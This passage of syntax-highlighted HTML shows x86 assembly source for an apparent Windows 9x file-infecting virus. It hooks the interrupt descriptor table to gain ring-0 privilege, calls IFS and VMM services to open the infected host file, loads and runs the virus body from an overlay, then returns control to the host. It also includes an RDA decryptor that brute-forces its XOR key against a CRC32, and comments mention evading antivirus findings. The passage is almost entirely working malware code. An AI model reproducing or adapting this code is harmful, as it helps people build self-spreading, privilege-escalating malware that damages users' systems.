       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc9">%endif</span><span class="sc0">

</span><span class="sc5">_main</span><span class="sc0">

</span><span class="sc5">loader</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">.seh</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.removeseh</span><span class="sc0">
  </span><span class="sc5">.seh</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc8">fs</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc8">fs</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                 </span><span class="sc1">;seh frame set</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">.delta</span><span class="sc0">
  </span><span class="sc5">.delta</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">.delta</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">sidt</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;get idt to ebx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">cli</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0x4</span><span class="sc4">+(</span><span class="sc2">0x5</span><span class="sc4">*</span><span class="sc2">0x8</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+(</span><span class="sc2">0x5</span><span class="sc4">*</span><span class="sc2">0x8</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ring0</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;new int5 handler</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+(</span><span class="sc2">0x5</span><span class="sc4">*</span><span class="sc2">0x8</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">bswap</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0x6</span><span class="sc4">+(</span><span class="sc2">0x5</span><span class="sc4">*</span><span class="sc2">0x8</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x5</span><span class="sc0">                                 </span><span class="sc1">;jump to ring0</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
  </span><span class="sc5">.removeseh</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sti</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc8">fs</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;remove seh frame</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0x68</span><span class="sc0">                                 </span><span class="sc1">;return to host</span><span class="sc0">
  </span><span class="sc5">.entrypoint</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">.ret</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc5">.ret</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">IFS</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc5">vxdcall</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x32</span><span class="sc0">                      </span><span class="sc1">;just one place to fix</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ring0</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">IFS</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20CD</span><span class="sc0">                          </span><span class="sc1">;these linez fix the previous</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">                                   </span><span class="sc1">;bug, found by AVz</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x32</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">bname</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc9">name</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD500</span><span class="sc0">                         </span><span class="sc1">;openfile</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IFS</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">.skip</span><span class="sc0">
       </span><span class="sc6">iret</span><span class="sc0">                                    </span><span class="sc1">;cant open host</span><span class="sc0">
  </span><span class="sc5">.skip</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">8192</span><span class="sc0">
  </span><span class="sc5">fix3</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc5">vxdcall</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0D</span><span class="sc0">                      </span><span class="sc1">;vmm alloc</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">.error</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD800</span><span class="sc0">                         </span><span class="sc1">;get filesize</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IFS</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vsize</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD600</span><span class="sc0">                         </span><span class="sc1">;read overlay</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IFS</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">install</span><span class="sc4">-</span><span class="sc5">hook</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;call it!</span><span class="sc0">
  </span><span class="sc5">.error</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">lsize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">loader</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">name</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

    </span><span class="sc9">%if</span><span class="sc0"> </span><span class="sc5">userda</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc0">
  </span><span class="sc5">rda_sz</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">16</span><span class="sc0">
  </span><span class="sc5">rda_crc</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">12</span><span class="sc0">
  </span><span class="sc5">rda_pbfr</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">08</span><span class="sc0">
  </span><span class="sc5">rda_ret@</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">04</span><span class="sc0">
  </span><span class="sc5">rda_ebp@</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">00</span><span class="sc0">
  </span><span class="sc5">rda_pass</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">04</span><span class="sc0">
  </span><span class="sc5">rda_key</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">08</span><span class="sc0">

</span><span class="sc5">rda</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">enter</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                              </span><span class="sc1">;2 dwords as local var</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rda_pass</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rda_key</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;setup rda</span><span class="sc0">
  </span><span class="sc5">.setup</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rda_pbfr</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rda_sz</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rda_key</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;setup loop</span><span class="sc0">
  </span><span class="sc5">.loop</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.loop</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rda_pass</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;increase pass counter</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rda_pass</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.check</span><span class="sc0">                              </span><span class="sc1">;first pass</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rda_pass</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rda_key</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;new key</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">.setup</span><span class="sc0">
  </span><span class="sc5">.check</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rda_pbfr</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rda_sz</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crc32</span><span class="sc0">                              </span><span class="sc1">;calc crc32</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rda_crc</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.setup</span><span class="sc0">                              </span><span class="sc1">;crc32 dont match</span><span class="sc0">
       </span><span class="sc6">leave</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc9">%endif</span><span class="sc0">

</span><span class="sc5">vsize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc10">$$</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">bname</span><span class="sc4">:</span><span class="sc0">
</span></div></body>
</html>
